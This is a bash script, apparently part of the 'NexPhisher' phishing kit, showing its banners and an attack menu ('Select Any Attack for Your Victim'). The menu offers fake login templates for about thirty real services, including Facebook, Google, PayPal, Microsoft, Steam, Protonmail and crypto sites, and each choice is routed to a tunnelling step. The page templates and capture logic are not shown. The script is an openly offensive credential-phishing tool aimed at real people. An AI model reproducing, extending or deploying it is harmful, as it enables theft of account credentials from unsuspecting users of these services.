#!bin/bash
banner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[92m  _   _            \e[0m\e[93m _____  _     _     _                \e[0m\n"
printf "\e[0m\e[92m | \ | |           \e[0m\e[93m|  __ \| |   (_)   | |               \e[0m\n"
printf "\e[0m\e[92m |  \| | _____  __ \e[0m\e[93m| |__) | |__  _ ___| |__   ___ _ __  \e[0m\n"
printf "\e[0m\e[92m | .   |/ _ \ \/ / \e[0m\e[93m|  ___/|  _ \| / __|  _ \ / _ \  __| \e[0m\n"
printf "\e[0m\e[92m | |\  |  __/>  <  \e[0m\e[93m| |    | | | | \__ \ | | |  __/ |    \e[0m\n"
printf "\e[0m\e[92m |_| \_|\___/_/\_\ \e[0m\e[93m|_|    |_| |_|_|___/_| |_|\___|_| \e[0m\e[1;44m[V 1.0]\e[0m\n"
printf "\e[0m\n"
printf " \e[0m\e[1;41m Advanced Phishing Tool with 30+ Templates  [BY : HTR-TECH ]\e[0m\n"
printf "\e[0m\n"

}

smallbanner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[93m _  _ ___ _   _    ___  _  _ ___ ___ _  _ ___  ___ \e[0m\n"
printf "\e[0m\e[93m |\ | |__  \_/    |___] |__|  |  |__ |__| |__ |__/ \e[0m\n"
printf "\e[0m\e[93m | \| |__ _/ \_   |    _|  | _|_ ___||  |_|__ | \_ \e[0m\e[1;46m[V 1.0]\e[0m\n"
printf "\e[0m\n"
printf "    \e[0m\e[1;44m Advanced Phishing Tool with 30+ Templates\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[91m    [\e[0m\e[96m BY \e[0m\e[91m: \e[0m\e[96mhttps://github.com/htr-tech \e[0m\e[91m] \e[0m\n"
printf "\e[0m\n"

}

menu() {

printf "      \e[0m\e[1;46m[::]  Select Any Attack for Your Victim  [::]\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt	\e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m About\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Badoo		\e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google      \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat    \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Origin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Microsoft   \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m Linkedin    \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m CryptoCoin\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Netflix     \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m Ebay        \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m Yahoo	\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Paypal      \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m Dropbox     \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Protonmail  \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Yandex	\e[0m\n"		
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;93m XBOX\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
tunnel_menu
elif [[ $menu_option == 99 ]]; then
about
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

